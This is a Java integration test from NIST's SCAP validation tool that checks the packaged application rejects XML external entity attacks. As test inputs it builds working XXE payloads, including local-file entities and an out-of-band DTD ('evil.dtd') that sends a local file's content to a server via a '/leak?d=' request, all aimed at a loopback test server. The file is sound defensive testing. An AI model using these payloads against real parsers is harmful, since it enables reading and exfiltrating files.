/**
 * Portions of this software was developed by employees of the National Institute
 * of Standards and Technology (NIST), an agency of the Federal Government and is
 * being made available as a public service. Pursuant to title 17 United States
 * Code Section 105, works of NIST employees are not subject to copyright
 * protection in the United States. This software may be subject to foreign
 * copyright. Permission in the United States and in foreign countries, to the
 * extent that NIST may hold copyright, to use, copy, modify, create derivative
 * works, and distribute this software and its documentation without fee is hereby
 * granted on a non-exclusive basis, provided that this notice and disclaimer
 * of warranty appears in all copies.
 *
 * THE SOFTWARE IS PROVIDED 'AS IS' WITHOUT ANY WARRANTY OF ANY KIND, EITHER
 * EXPRESSED, IMPLIED, OR STATUTORY, INCLUDING, BUT NOT LIMITED TO, ANY WARRANTY
 * THAT THE SOFTWARE WILL CONFORM TO SPECIFICATIONS, ANY IMPLIED WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND FREEDOM FROM
 * INFRINGEMENT, AND ANY WARRANTY THAT THE DOCUMENTATION WILL CONFORM TO THE
 * SOFTWARE, OR ANY WARRANTY THAT THE SOFTWARE WILL BE ERROR FREE.  IN NO EVENT
 * SHALL NIST BE LIABLE FOR ANY DAMAGES, INCLUDING, BUT NOT LIMITED TO, DIRECT,
 * INDIRECT, SPECIAL OR CONSEQUENTIAL DAMAGES, ARISING OUT OF, RESULTING FROM,
 * OR IN ANY WAY CONNECTED WITH THIS SOFTWARE, WHETHER OR NOT BASED UPON WARRANTY,
 * CONTRACT, TORT, OR OTHERWISE, WHETHER OR NOT INJURY WAS SUSTAINED BY PERSONS OR
 * PROPERTY OR OTHERWISE, AND WHETHER OR NOT LOSS WAS SUSTAINED FROM, OR AROSE OUT
 * OF THE RESULTS OF, OR USE OF, THE SOFTWARE OR SERVICES PROVIDED HEREUNDER.
 */

package gov.nist.secauto.scap.validation;

import gov.nist.secauto.decima.xml.document.JDOMDocument;
import gov.nist.secauto.decima.xml.util.XMLSecurity;

import com.sun.net.httpserver.HttpServer;
import org.junit.Rule;
import org.junit.Test;
import org.junit.Before;
import org.junit.rules.TemporaryFolder;

import java.io.File;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.jar.JarFile;
import java.util.zip.ZipFile;

import javax.xml.parsers.DocumentBuilderFactory;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

/** Execute the assembled application with no source-tree runtime dependencies. */
public class XXEDistributionIT {
  @Rule
  public TemporaryFolder temporary = new TemporaryFolder();

  private File distribution;
  private final String appJar = System.getProperty("project.build.finalName") + ".jar";

  @Before
  public void unpackActualArchive() throws Exception {
    distribution = temporary.newFolder("distribution");
    File archive = new File(System.getProperty("project.build.directory"),
        System.getProperty("project.build.finalName") + ".zip");
    try (ZipFile zip = new ZipFile(archive)) {
      java.util.Enumeration<? extends java.util.zip.ZipEntry> entries = zip.entries();
      while (entries.hasMoreElements()) {
        java.util.zip.ZipEntry entry = entries.nextElement();
        File target = new File(distribution, entry.getName());
        assertTrue(target.getCanonicalPath().startsWith(distribution.getCanonicalPath() + File.separator));
        if (entry.isDirectory()) {
          Files.createDirectories(target.toPath());
        } else {
          Files.createDirectories(target.toPath().getParent());
          try (java.io.InputStream input = zip.getInputStream(entry)) {
            Files.copy(input, target.toPath());
          }
        }
      }
    }
  }

  @Test
  public void packagedDependencyInventoryAndIndependentDecimaProbe() throws Exception {
    File[] decima
        = new File(distribution, "lib").listFiles((dir, name) -> name.startsWith("decima-") && name.endsWith(".jar"));
    assertNotNull(decima);
    assertTrue(decima.length > 0);
    for (File jar : decima) {
      assertTrue("All packaged decima modules must use the integrated coordinate: " + jar,
          jar.getName().endsWith("-0.7.2-SNAPSHOT.jar"));
    }
    File xmlJar = new File(distribution, "lib/decima-xml-0.7.2-SNAPSHOT.jar");
    File integratedXml = new File(XMLSecurity.class.getProtectionDomain().getCodeSource().getLocation().toURI());
    org.junit.Assert.assertArrayEquals("The archive must contain the exact integrated Maven artifact",
        Files.readAllBytes(integratedXml.toPath()), Files.readAllBytes(xmlJar.toPath()));
    try (JarFile jar = new JarFile(xmlJar)) {
      assertNotNull(jar.getEntry("gov/nist/secauto/decima/xml/util/XMLSecurity.class"));
      assertNotNull(jar.getEntry("gov/nist/secauto/decima/xml/util/SecureXMLReader.class"));
    }
    File archive = new File(System.getProperty("project.build.directory"),
        System.getProperty("project.build.finalName") + ".zip");
    try (ZipFile zip = new ZipFile(archive)) {
      assertNotNull(zip.getEntry("lib/decima-xml-0.7.2-SNAPSHOT.jar"));
      assertFalse(zip.stream().anyMatch(entry -> entry.getName().matches(".*decima-.*-0\\.7\\.1\\.jar")));
    }
    File candidate = write("probe.xml", "<!DOCTYPE root [<!ENTITY leak 'harmless'>]><root>&leak;</root>");
    String classpath = new File(System.getProperty("project.build.directory"), "test-classes").getAbsolutePath()
        + File.pathSeparator + new File(distribution, appJar).getAbsolutePath()
        + File.pathSeparator + new File(distribution, "lib/*").getAbsolutePath();
    Result result = run(Arrays.asList("-cp", classpath, PackagedProbe.class.getName(),
        distribution.getCanonicalPath(), candidate.toString()));
    assertEquals(result.output, 0, result.exit);
    assertTrue(result.output.contains("PACKAGED_DECIMA_REJECTED"));
  }

  public static class PackagedProbe {
    public static void main(String[] args) throws Exception {
      File origin = new File(XMLSecurity.class.getProtectionDomain().getCodeSource().getLocation().toURI());
      if (!origin.getCanonicalPath().startsWith(args[0] + File.separator)
          || !origin.getName().equals("decima-xml-0.7.2-SNAPSHOT.jar")) {
        throw new AssertionError("Unexpected XML security class origin: " + origin);
      }
      try {
        new JDOMDocument(new File(args[1]));
        throw new AssertionError("Packaged parser accepted DOCTYPE");
      } catch (gov.nist.secauto.decima.core.document.DocumentException expected) {
        System.out.println("PACKAGED_DECIMA_REJECTED " + origin);
        System.out.println("PARSER_PROVIDER " + XMLSecurity.newXMLReader().getClass().getName());
      }
    }
  }

  @Test
  public void packagedCliRejectsEntitiesSecondaryDocumentsAndBatchResults() throws Exception {
    String canary = "HARMLESS-PACKAGED-" + UUID.randomUUID();
    File local = write("canary.txt", canary);
    AtomicInteger requests = new AtomicInteger();
    HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
    String origin = "http://127.0.0.1:" + server.getAddress().getPort();
    server.createContext("/", exchange -> {
      requests.incrementAndGet();
      byte[] response = ("<!ENTITY leak SYSTEM '" + local.toURI() + "'>").getBytes(StandardCharsets.UTF_8);
      exchange.sendResponseHeaders(200, response.length);
      try (java.io.OutputStream output = exchange.getResponseBody()) {
        output.write(response);
      }
    });
    server.start();
    try {
      String[] declarations = { "<!DOCTYPE root [<!ENTITY leak SYSTEM '" + local.toURI() + "'>]>",
          "<!DOCTYPE root [<!ENTITY % p SYSTEM '" + origin + "/parameter'>%p;]>",
          "<!DOCTYPE root SYSTEM '" + origin + "/dtd'>" };
      for (String declaration : declarations) {
        File input = write("input.xml", declaration + "<root>&leak;</root>");
        for (List<String> options : Arrays.asList(Arrays.asList("-auto", input.toString()),
            Arrays.asList("-file", input.toString(), "-scapversion", "1.4"),
            Arrays.asList("-componentfile", input.toString()))) {
          Result result = cli(options);
          assertTrue(result.output, result.exit != 0);
          assertTrue(result.output, result.output.contains("DOCTYPE"));
          assertFalse(result.output.contains(canary));
          assertEquals(0, requests.get());
        }
      }
      File result = write("result.xml",
          "<asset-report-collection xmlns='http://scap.nist.gov/schema/asset-reporting-format/1.1'/>");
      File source = write("source.xml", declarations[0] + "<root>&leak;</root>");
      Result secondary
          = cli(Arrays.asList("-resultfile", result.toString(), "-scapversion", "1.4", "-sourceds", source.toString(),
              "-combinedoutput", new File(temporary.getRoot(), "combined.xml").toString()));
      assertTrue(secondary.output, secondary.exit != 0);
      assertTrue(secondary.output.contains("DOCTYPE"));
      File batch = temporary.newFolder("batch");
      Files.writeString(new File(batch, "bad.xml").toPath(), declarations[2] + "<root/>");
      write("bad-validation-result.xml", declarations[2] + "<root>&leak;</root>");
      Result batchResult = cli(Arrays.asList("-auto", batch.toString()));
      assertEquals(batchResult.output, 1, batchResult.exit);
      assertFalse(batchResult.output.contains(canary));
      assertEquals(0, requests.get());
      File zipInput = new File(temporary.getRoot(), "unsupported.zip");
      try (java.util.zip.ZipOutputStream zip
          = new java.util.zip.ZipOutputStream(Files.newOutputStream(zipInput.toPath()))) {
        zip.putNextEntry(new java.util.zip.ZipEntry("content.xml"));
        zip.write("<root/>".getBytes(StandardCharsets.UTF_8));
        zip.closeEntry();
      }
      Result zipRejected = cli(Arrays.asList("-file", zipInput.toString(), "-scapversion", "1.4"));
      assertTrue(zipRejected.output, zipRejected.exit != 0);
      assertTrue(zipRejected.output.contains("SCAP 1.1"));
      Result autoZipRejected = cli(Arrays.asList("-auto", zipInput.toString()));
      assertTrue(autoZipRejected.output, autoZipRejected.exit != 0);
      File renamedZip = new File(temporary.getRoot(), "unsupported.xml");
      Files.copy(zipInput.toPath(), renamedZip.toPath());
      assertTrue(cli(Arrays.asList("-file", renamedZip.toString(), "-scapversion", "1.4")).exit != 0);
      assertFalse(new File(temporary.getRoot(), "content.xml").exists());
      for (File output : temporary.getRoot().listFiles()) {
        if (output.getName().endsWith(".html") || output.getName().endsWith(".log")) {
          assertFalse(Files.readString(output.toPath()).contains(canary));
        }
      }
      // Verify a small legitimate component through the packaged parser/schema/Schematron pipeline.
      File fixture = new File("src/test/resources/candidates/components/oval/oval-variables-5-12-3.xml");
      File valid = new File(temporary.getRoot(), "valid.xml");
      Files.copy(fixture.toPath(), valid.toPath());
      Result validResult = cli(Arrays.asList("-componentfile", valid.toString()));
      assertEquals(validResult.output, 0, validResult.exit);
      assertEquals(0, requests.get());
    } finally {
      server.stop(0);
    }
  }

  /**
   * Recreates the out-of-band exfiltration described in the 2026-10-20 external security report. A DOCTYPE on a
   * real SCAP 1.2, 1.3 or 1.4 data stream points at an external DTD whose parameter entities would send the
   * content of a local file to the attacker's web server. The reporter's original sample file was not provided,
   * so the file is rebuilt from the report's description.
   */
  @Test
  public void packagedCliRejectsOutOfBandExfiltrationFromExternalDtd() throws Exception {
    String canary = "HARMLESS-OOB-" + UUID.randomUUID();
    File local = write("oob-canary.txt", canary);
    AtomicInteger requests = new AtomicInteger();
    HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
    String origin = "http://127.0.0.1:" + server.getAddress().getPort();
    byte[] dtd = ("<!ENTITY % file SYSTEM '" + local.toURI() + "'>\n"
        + "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM '" + origin + "/leak?d=%file;'>\">\n"
        + "%eval;\n%exfil;\n").getBytes(StandardCharsets.UTF_8);
    server.createContext("/", exchange -> {
      requests.incrementAndGet();
      if (exchange.getRequestURI().getPath().equals("/evil.dtd")) {
        exchange.sendResponseHeaders(200, dtd.length);
        try (java.io.OutputStream output = exchange.getResponseBody()) {
          output.write(dtd);
        }
      } else {
        exchange.sendResponseHeaders(200, -1);
      }
      exchange.close();
    });
    server.start();
    try {
      String[][] carriers = {
          { "1.2", "src/test/resources/candidates/scap-12/scap_gov.nist_USGCB-Windows-XP-firewall.xml" },
          { "1.3", "src/test/resources/candidates/scap-13/source_data_stream_collection_sample.xml" },
          { "1.4", "src/test/resources/candidates/scap-14/source_data_stream_collection_sample.xml" } };
      for (String[] carrier : carriers) {
        String version = carrier[0];
        String text = Files.readString(new File(carrier[1]).toPath());
        assertTrue(text.startsWith("<?xml"));
        int declarationEnd = text.indexOf("?>") + 2;
        File input = write("oob-recreated-" + version + ".xml", text.substring(0, declarationEnd)
            + "\n<!DOCTYPE data-stream-collection SYSTEM '" + origin + "/evil.dtd'>" + text.substring(declarationEnd));

        // Control: a parser with default settings must reach the server, otherwise the checks below prove nothing.
        requests.set(0);
        try {
          DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);
        } catch (Exception e) {
          // The parse outcome is irrelevant. Only the requests it makes are checked.
        }
        assertTrue("Control parser did not reach the test server for SCAP " + version, requests.get() > 0);
        requests.set(0);

        File resultFile = new File(temporary.getRoot(), "vr-" + version + ".xml");
        File reportFile = new File(temporary.getRoot(), "vr-" + version + ".html");
        for (List<String> options : Arrays.asList(
            Arrays.asList("-file", input.toString(), "-scapversion", version, "-usecase", "CONFIGURATION",
                "-valresultfile", resultFile.toString(), "-valreportfile", reportFile.toString()),
            Arrays.asList("-auto", input.toString()))) {
          Result result = cli(options);
          assertTrue("SCAP " + version + ": " + result.output, result.exit != 0);
          assertTrue("SCAP " + version + ": " + result.output, result.output.contains("DOCTYPE"));
          assertFalse(result.output.contains(canary));
          assertEquals("SCAP " + version, 0, requests.get());
        }
        for (File produced : new File[] { resultFile, reportFile }) {
          if (produced.exists()) {
            assertFalse(Files.readString(produced.toPath()).contains(canary));
          }
        }
      }
    } finally {
      server.stop(0);
    }
  }

  private Result cli(List<String> options) throws Exception {
    List<String> args = new ArrayList<>(Arrays.asList("-jar", new File(distribution, appJar).getAbsolutePath()));
    args.addAll(options);
    return run(args);
  }

  private Result run(List<String> options) throws Exception {
    List<String> command = new ArrayList<>();
    command.add(new File(System.getProperty("java.home"), "bin/java").toString());
    // Match the protocol handler option in both shipped launchers.
    command.add("-Djava.protocol.handler.pkgs=sun.net.www.protocol");
    command.addAll(options);
    File log = new File(temporary.getRoot(), UUID.randomUUID() + ".log");
    Process process = new ProcessBuilder(command).directory(temporary.getRoot()).redirectErrorStream(true)
        .redirectOutput(log).start();
    try {
      assertTrue("Packaged execution timed out", process.waitFor(3, TimeUnit.MINUTES));
      return new Result(process.exitValue(), Files.readString(log.toPath()));
    } finally {
      process.destroyForcibly();
    }
  }

  private File write(String name, String content) throws Exception {
    File file = new File(temporary.getRoot(), name);
    Files.write(file.toPath(), content.getBytes(StandardCharsets.UTF_8));
    return file;
  }

  private static class Result {
    private final int exit;
    private final String output;

    Result(int exit, String output) {
      this.exit = exit;
      this.output = output;
    }
  }
}
